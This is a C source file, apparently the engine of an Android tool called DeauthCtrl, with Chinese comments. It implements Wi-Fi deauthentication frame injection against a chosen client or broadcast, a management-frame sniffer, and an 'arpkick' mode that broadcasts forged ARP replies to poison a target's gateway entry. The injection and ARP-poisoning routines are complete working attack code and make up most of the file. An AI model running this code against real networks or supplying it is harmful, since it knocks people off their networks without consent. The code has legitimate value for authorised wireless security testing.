/*
 * deauth-frame —— 原生 802.11 注入/被动嗅探器(纯 C,无第三方依赖)
 *
 * DeauthCtrl 内置引擎。两种模式:
 *
 *   注入:  deauth-frame <iface> <bssid> <client_mac|broadcast> <count> [interval_ms]
 *   嗅探:  deauth-frame capture <iface> [channel]
 *
 * 前提(Android 平台硬限制,缺一不可):
 *   - root(su 执行,否则 AF_PACKET 被 SELinux 拒绝)
 *   - 接口已进入监控模式(Nexmon 固件 / nexutil / iw 完成)
 *   - 芯片固件支持帧注入(注入模式)或监控(嗅探模式)
 *
 * 注入模式: Radiotap 头(12B) + 802.11 管理帧头(24B) + Deauth 固定字段(2B),
 * 每注入一帧向 stdout 输出 "DeAuth <seq>" 供上层引擎计数。
 * 嗅探模式: 逐帧解析 radiotap + 802.11 管理帧(信标/探测/去认证),
 * 输出 "FRAME <type> <src> <dst> <ssid|->" 供上层引擎流式日志。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

#define FRAME_LEN 38 /* 12 radiotap + 24 mgmt + 2 reason */
#define REASON_CODE 7 /* Class 3 frame received from nonassociated STA */
#define CAPTURE_BUF 4096

static volatile int g_stop = 0;

static void on_sigint(int sig) { (void)sig; g_stop = 1; }

static int parse_mac(const char *s, unsigned char out[6]) {
    unsigned int m[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return -1;
    for (int i = 0; i < 6; i++) {
        if (m[i] > 0xFF) return -1;
        out[i] = (unsigned char)m[i];
    }
    return 0;
}

static void mac_to_str(const unsigned char *m, char *out) {
    sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void nsleep_ms(long ms) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static int open_monitor_socket(const char *iface, struct sockaddr_ll *sa) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        fprintf(stderr, "socket(AF_PACKET) failed: %s —— 需要 root 且接口处于监控模式\n", strerror(errno));
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "ioctl(SIOCGIFINDEX) failed for %s: %s\n", iface, strerror(errno));
        close(sock);
        return -1;
    }
    memset(sa, 0, sizeof(*sa));
    sa->sll_family = AF_PACKET;
    sa->sll_ifindex = ifr.ifr_ifindex;
    sa->sll_protocol = htons(ETH_P_ALL);
    return sock;
}

/** 嗅探模式:逐帧解析管理帧并输出一行(radiotap + 802.11) */
static int capture_mode(const char *iface) {
    struct sockaddr_ll sa;
    int sock = open_monitor_socket(iface, &sa);
    if (sock < 0) return 1;

    unsigned char buf[CAPTURE_BUF];
    fprintf(stderr, "capture: listening on %s (Ctrl-C 退出)\n", iface);

    while (!g_stop) {
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
        if (n < 0) {
            if (errno == EINTR) continue;
            fprintf(stderr, "recvfrom failed: %s\n", strerror(errno));
            break;
        }
        if (n < 26) continue; /* radiotap(≥8) + FC(2) + 3×addr(18) 至少 */
        /* radiotap 头长度: 小端 uint16 在偏移 2 */
        unsigned int rtlen = (unsigned int)buf[2] | ((unsigned int)buf[3] << 8);
        if (rtlen < 8 || rtlen + 24 > (unsigned int)n) continue;
        const unsigned char *h = buf + rtlen; /* 802.11 头起点 */
        unsigned int type = (h[0] & 0x0C) >> 2;
        unsigned int subtype = (h[1] & 0xF0) >> 4;
        if (type != 0) continue; /* 只关注管理帧 */
        const char *typeName = "MGMT";
        switch (subtype) {
            case 4: typeName = "PROBE"; break;
            case 5: typeName = "PROBE-RESP"; break;
            case 8: typeName = "BEACON"; break;
            case 11: typeName = "AUTH"; break;
            case 12: typeName = "DEAUTH"; break;
            case 0: typeName = "ASSOC-REQ"; break;
            case 1: typeName = "ASSOC-RESP"; break;
            default: continue; /* 其余管理帧不输出 */
        }
        char src[18], dst[18];
        mac_to_str(h + 10, src); /* addr2 = 发送者 */
        mac_to_str(h + 4, dst);  /* addr1 = 接收者 */
        /* SSID: 固定 24B 头后逐 element 扫描 id=0 */
        char ssid[64] = "-";
        unsigned int off = rtlen + 24;
        while (off + 2 <= (unsigned int)n) {
            unsigned int eid = buf[off];
            unsigned int elen = buf[off + 1];
            if (eid == 0 && elen > 0 && elen < 33 && off + 2 + elen <= (unsigned int)n) {
                memcpy(ssid, buf + off + 2, elen);
                ssid[elen] = '\0';
                /* 过滤不可打印字符 */
                for (unsigned int i = 0; i < elen; i++) {
                    if (ssid[i] < 0x20 || ssid[i] > 0x7E) { ssid[0] = '('; ssid[1] = '?'; ssid[2] = ')'; ssid[3] = '\0'; break; }
                }
                break;
            }
            if (eid == 0 && elen == 0) break; /* 空 SSID(探测广播) */
            off += 2 + elen;
        }
        printf("FRAME %s %s %s %s\n", typeName, src, dst, ssid);
        fflush(stdout);
    }
    fprintf(stderr, "capture: stopped\n");
    close(sock);
    return 0;
}

/** ARP 投毒踢人:向目标广播伪造 ARP 应答,宣称网关在假 MAC 上 */
static int arpkick_mode(const char *iface, const char *target_ip_s, const char *gateway_ip_s, long count, long interval_ms) {
    struct sockaddr_ll sa;
    int sock = open_monitor_socket(iface, &sa);
    if (sock < 0) return 1;
    if (interval_ms <= 0) interval_ms = 200;

    unsigned int tip = inet_addr(target_ip_s);
    unsigned int gip = inet_addr(gateway_ip_s);
    if (tip == INADDR_NONE || gip == INADDR_NONE) { fprintf(stderr, "bad ip\n"); return 2; }

    /* Ethernet(14) + ARP(28) = 42 字节 */
    unsigned char pkt[42];
    memset(pkt, 0, sizeof(pkt));
    memset(pkt, 0xFF, 6);              /* eth dst = broadcast */
    memset(pkt + 6, 0xDE, 6);          /* eth src = 假 MAC */
    pkt[12] = 0x08; pkt[13] = 0x06;    /* ethertype ARP */
    unsigned char *a = pkt + 14;
    a[0] = 0x00; a[1] = 0x01;          /* htype ethernet */
    a[2] = 0x08; a[3] = 0x00;          /* ptype IPv4 */
    a[4] = 6; a[5] = 4;                /* hlen/plen */
    a[6] = 0x00; a[7] = 0x02;          /* op = reply */
    memset(a + 8, 0xDE, 6);            /* sha = 假 MAC(宣称网关在此) */
    memcpy(a + 14, &gip, 4);           /* spa = 网关 IP */
    memset(a + 18, 0xFF, 6);           /* tha = broadcast(广播投毒) */
    memcpy(a + 24, &tip, 4);           /* tpa = 目标 IP */

    long sent = 0;
    fprintf(stderr, "arpkick: iface=%s target=%s gateway=%s count=%ld interval=%ldms\n",
            iface, target_ip_s, gateway_ip_s, count, interval_ms);

    while (!g_stop) {
        if (count > 0 && sent >= count) break;
        ssize_t n = sendto(sock, pkt, sizeof(pkt), 0, (struct sockaddr *)&sa, sizeof(sa));
        if (n < 0) {
            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
            break;
        }
        sent++;
        printf("ARPKICK %ld\n", sent); /* 引擎按此模式计数 */
        fflush(stdout);
        if (count > 0 && sent >= count) break;
        nsleep_ms(interval_ms);
    }
    fprintf(stderr, "arpkick: sent %ld frames, exiting\n", sent);
    close(sock);
    return 0;
}

static int inject_mode(const char *iface, const char *bssid_s, const char *target_s, long count, long interval_ms) {
    struct sockaddr_ll sa;
    int sock = open_monitor_socket(iface, &sa);
    if (sock < 0) return 1;

    unsigned char bssid[6], client[6];
    if (parse_mac(bssid_s, bssid) != 0) { fprintf(stderr, "bad bssid\n"); return 2; }
    int is_broadcast = strcmp(target_s, "broadcast") == 0;
    if (!is_broadcast && parse_mac(target_s, client) != 0) { fprintf(stderr, "bad client mac\n"); return 2; }
    if (interval_ms <= 0) interval_ms = 100;

    /* Radiotap 头:版本 0,长度 12,Flags=0(无 FCS) */
    unsigned char frame[FRAME_LEN];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x00;                 /* radiotap version */
    frame[1] = 0x00;                 /* pad */
    frame[2] = 12; frame[3] = 0;     /* radiotap length (LE) */
    frame[4] = 0x00; frame[5] = 0x00; frame[6] = 0x00; frame[7] = 0x00; /* present flags */

    /* 802.11 管理帧头:FC = 0xC0(Deauth), addr1=client/bcast, addr2=bssid, addr3=bssid */
    unsigned char *h = frame + 12;
    h[0] = 0xC0; h[1] = 0x00;        /* frame control */
    h[2] = 0x00; h[3] = 0x00;        /* duration */
    if (is_broadcast) {
        memset(h + 4, 0xFF, 6);      /* addr1 = broadcast */
    } else {
        memcpy(h + 4, client, 6);    /* addr1 = 目标客户端 */
    }
    memcpy(h + 10, bssid, 6);        /* addr2 = BSSID(AP) */
    memcpy(h + 16, bssid, 6);        /* addr3 = BSSID */
    h[22] = 0x00; h[23] = 0x00;      /* seq ctl */

    frame[36] = REASON_CODE & 0xFF;
    frame[37] = (REASON_CODE >> 8) & 0xFF;

    long sent = 0;
    unsigned short seq = 0;
    fprintf(stderr, "deauth-frame: iface=%s bssid=%s target=%s count=%ld interval=%ldms\n",
            iface, bssid_s, is_broadcast ? "broadcast" : target_s, count, interval_ms);

    while (!g_stop) {
        if (count > 0 && sent >= count) break;
        h[22] = (unsigned char)(seq & 0xFF);
        h[23] = (unsigned char)((seq >> 8) & 0x0F);

        ssize_t n = sendto(sock, frame, sizeof(frame), 0, (struct sockaddr *)&sa, sizeof(sa));
        if (n < 0) {
            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
            break;
        }
        sent++;
        seq++;
        printf("DeAuth %ld\n", sent); /* 引擎按此模式计数 */
        fflush(stdout);
        if (count > 0 && sent >= count) break;
        nsleep_ms(interval_ms);
    }

    fprintf(stderr, "deauth-frame: sent %ld frames, exiting\n", sent);
    close(sock);
    return 0;
}

int main(int argc, char **argv) {
    if (argc >= 6 && strcmp(argv[1], "arpkick") == 0) {
        signal(SIGINT, on_sigint);
        signal(SIGTERM, on_sigint);
        return arpkick_mode(argv[2], argv[3], argv[4], atol(argv[5]), argc > 6 ? atol(argv[6]) : 200);
    }
    if (argc >= 3 && strcmp(argv[1], "capture") == 0) {
        signal(SIGINT, on_sigint);
        signal(SIGTERM, on_sigint);
        return capture_mode(argv[2]);
    }
    if (argc < 5) {
        fprintf(stderr, "usage: %s <iface> <bssid> <client_mac|broadcast> <count> [interval_ms]\n", argv[0]);
        fprintf(stderr, "       %s capture <iface> [channel]\n", argv[0]);
        fprintf(stderr, "       %s arpkick <iface> <target_ip> <gateway_ip> <count> [interval_ms]\n", argv[0]);
        fprintf(stderr, "  count=0 持续注入直到 SIGINT;interval_ms 默认 100\n");
        return 2;
    }
    signal(SIGINT, on_sigint);
    signal(SIGTERM, on_sigint);
    return inject_mode(argv[1], argv[2], argv[3], atol(argv[4]), argc > 5 ? atol(argv[5]) : 100);
}

